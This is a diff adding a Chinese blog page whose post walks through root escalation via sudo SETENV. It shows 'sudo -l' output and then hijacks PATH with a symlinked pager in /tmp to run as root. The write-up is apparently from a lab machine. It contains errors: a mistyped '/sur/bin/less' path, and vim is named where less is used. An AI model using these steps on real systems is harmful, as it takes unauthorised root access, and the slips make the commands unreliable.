@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>sudo+SETENV(环境变量)提权 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+sudo -l
+sudo运行时默认会启用env_reset选项将从命令行设置的环境变量复原，因此通常情况下，当使用sudo命令时，通过本地修改环境变量也没法替换目标文件来进行提权，但如果sudo在配置时为用户设置了SETENV选项，情况就..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">sudo+SETENV(环境变量)提权</h2>
+            <div class="post-date">2023-03-04</div>
+            
+            <div class="post-content" v-pre>
+              <ol>
+<li>sudo -l<br>
+sudo运行时默认会启用env_reset选项将从命令行设置的环境变量复原，因此通常情况下，当使用sudo命令时，通过本地修改环境变量也没法替换目标文件来进行提权，但如果sudo在配置时为用户设置了SETENV选项，情况就不一样了。SETENV会允许用户禁用env_reset选项，允许sudo使用当前用户命令行中设置的环境变量，如下图：sudo允许当前用户以root身份执行一个shell脚本，并为当前用户配置了SETENV，shell脚本是打印syslog最后几行。</li>
+</ol>
+<pre><code>linuxmaster@mercury:~$ sudo -l
+Matching Defaults entries for linuxmaster on mercury:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User linuxmaster may run the following commands on mercury:
+    (root : root) SETENV: /usr/bin/check_syslog.sh
+
+</code></pre>
+<p>2.通过下面的命令，将/tmp目录放置在PATH环境变量的最前面<br>
+<code>ln -s /sur/bin/less /tmp/tail</code></p>
+<p><code>export PATH=/tmp:$PATH</code></p>
+<p>3.通过下面的命令即可运行我们伪造的tail命令，从而用vim进行提权</p>
+<p><code>sudo --preserve-env=PATH /usr/bin/check_syslog.sh</code></p>
+
+            </div>
+            
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
